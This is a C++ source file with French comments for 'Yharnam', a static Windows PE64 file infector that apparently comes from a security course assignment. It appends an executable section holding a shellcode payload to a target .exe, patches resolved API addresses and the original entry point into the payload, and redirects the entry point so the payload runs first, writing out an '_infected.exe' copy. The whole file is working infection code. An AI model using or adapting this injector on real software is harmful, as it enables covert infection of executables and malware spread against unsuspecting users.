//----------------------------------------------------------------------------
// injector.cpp – Injecteur PE64 statique « Yharnam » (version conforme sujet)
//----------------------------------------------------------------------------
// Linux  : x86_64-w64-mingw32-g++ -std=c++17 -static -O2 -s -o injector.exe injector.cpp
// Windows: cl /std:c++17 /O2 /EHsc /MT /nologo injector.cpp /link /out:injector.exe
//----------------------------------------------------------------------------
#include <windows.h>
#include <cstdio>
#include <cstdint>
#include <cstring>
#include <string>
#include <vector>
#include <filesystem>
#include <stdexcept>

namespace fs = std::filesystem;

#pragma pack(push,1)
// En-tête de section minimal (même disposition que IMAGE_SECTION_HEADER)
struct SectionHeader {
    uint8_t  Name[8];
    uint32_t VirtualSize;
    uint32_t VirtualAddress;
    uint32_t SizeOfRawData;
    uint32_t PointerToRawData;
    uint32_t PointerToRelocations;
    uint32_t PointerToLinenumbers;
    uint16_t NumberOfRelocations;
    uint16_t NumberOfLinenumbers;
    uint32_t Characteristics;
};
#pragma pack(pop)

// ---------------------------------------------------------------------------
// Helpers I/O
// ---------------------------------------------------------------------------
static std::vector<uint8_t> readFile(const std::string& path)
{
    FILE* f = std::fopen(path.c_str(), "rb");
    if(!f) throw std::runtime_error("lecture impossible : " + path);
    std::fseek(f, 0, SEEK_END);
    long sz = std::ftell(f);
    std::rewind(f);
    std::vector<uint8_t> buf(sz);
    std::fread(buf.data(), 1, sz, f);
    std::fclose(f);
    return buf;
}
static void writeFile(const std::string& path, const std::vector<uint8_t>& buf)
{
    FILE* f = std::fopen(path.c_str(), "wb");
    if(!f) throw std::runtime_error("écriture impossible : " + path);
    std::fwrite(buf.data(), 1, buf.size(), f);
    std::fclose(f);
}
static uint32_t align(uint32_t v, uint32_t a) { return (v + a - 1) & ~(a - 1); }

// ---------------------------------------------------------------------------
// Main
// ---------------------------------------------------------------------------
int main(int argc, char* argv[])
{
    if(argc != 2)
    {
        std::puts("Usage: injector.exe <cible.exe>");
        return 0;
    }

    // -----------------------------------------------------------------------
    // Chargements
    // -----------------------------------------------------------------------
    std::string tgt = argv[1];
    std::string out = fs::path(tgt).stem().string() + "_infected.exe";

    std::vector<uint8_t> payload = readFile("payload.bin");
    if(payload.size() < 40)                           // 4×dq = 32  + code
        throw std::runtime_error("payload.bin trop petit");

    std::vector<uint8_t> pe = readFile(tgt);

    // -----------------------------------------------------------------------
    // Entêtes PE
    // -----------------------------------------------------------------------
    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(pe.data());
    if(dos->e_magic != IMAGE_DOS_SIGNATURE)
        throw std::runtime_error("Signature DOS invalide");

    auto* nt  = reinterpret_cast<IMAGE_NT_HEADERS64*>(pe.data() + dos->e_lfanew);
    if(nt->Signature != IMAGE_NT_SIGNATURE ||
       nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
        throw std::runtime_error("Signature PE64 invalide");

    const uint32_t SA = nt->OptionalHeader.SectionAlignment;
    const uint32_t FA = nt->OptionalHeader.FileAlignment;

    // -----------------------------------------------------------------------
    // Préparation de la nouvelle section .yhar
    // -----------------------------------------------------------------------
    SectionHeader newSec{};
    std::memcpy(newSec.Name, ".yhar", 5);
    newSec.VirtualSize      = payload.size();
    newSec.VirtualAddress   = align(nt->OptionalHeader.SizeOfImage, SA);
    newSec.SizeOfRawData    = align(payload.size(), FA);
    newSec.PointerToRawData = align(pe.size(), FA);
    newSec.Characteristics  = IMAGE_SCN_MEM_EXECUTE |
                              IMAGE_SCN_MEM_READ    |
                              IMAGE_SCN_MEM_WRITE   |
                              IMAGE_SCN_CNT_CODE;

    // -----------------------------------------------------------------------
    // Agrandit le buffer PE (peut réallouer) puis recalcule les pointeurs
    // -----------------------------------------------------------------------
    pe.resize(newSec.PointerToRawData + newSec.SizeOfRawData, 0);
    dos = reinterpret_cast<IMAGE_DOS_HEADER*>(pe.data());
    nt  = reinterpret_cast<IMAGE_NT_HEADERS64*>(pe.data() + dos->e_lfanew);

    // -----------------------------------------------------------------------
    // Patch dynamique dans la payload
    // -----------------------------------------------------------------------
    HMODULE hK32        = GetModuleHandleA("kernel32.dll");     // déjà chargé
    FARPROC pLoadLib    = GetProcAddress(hK32, "LoadLibraryA");
    FARPROC pGetProc    = GetProcAddress(hK32, "GetProcAddress");
    uint64_t originalEP = nt->OptionalHeader.AddressOfEntryPoint +
                          nt->OptionalHeader.ImageBase;

    size_t sz = payload.size();
    std::memcpy(&payload[sz - 32], &pLoadLib,    sizeof(pLoadLib));     // ptr_LoadLibraryA
    std::memcpy(&payload[sz - 24], &pGetProc,    sizeof(pGetProc));     // ptr_GetProcAddress
    /* -16 = ptr_MessageBoxA sera résolu par le stub à l’exécution           */
    std::memcpy(&payload[sz -  8], &originalEP,  sizeof(originalEP));   // original_oep

    // -----------------------------------------------------------------------
    // Copie payload + ajoute l’en-tête de section
    // -----------------------------------------------------------------------
    std::memcpy(&pe[newSec.PointerToRawData], payload.data(), payload.size());

    auto* first = IMAGE_FIRST_SECTION(nt);
    auto* slot  = reinterpret_cast<SectionHeader*>(
                  reinterpret_cast<uint8_t*>(first) +
                  nt->FileHeader.NumberOfSections * sizeof(SectionHeader));
    *slot = newSec;
    nt->FileHeader.NumberOfSections += 1;

    nt->OptionalHeader.SizeOfImage        = align(newSec.VirtualAddress +
                                                  newSec.VirtualSize, SA);
    nt->OptionalHeader.AddressOfEntryPoint = newSec.VirtualAddress;

    // -----------------------------------------------------------------------
    // Sauvegarde
    // -----------------------------------------------------------------------
    writeFile(out, pe);
    std::printf("Infection reussie → %s\n", out.c_str());
    return 0;
}
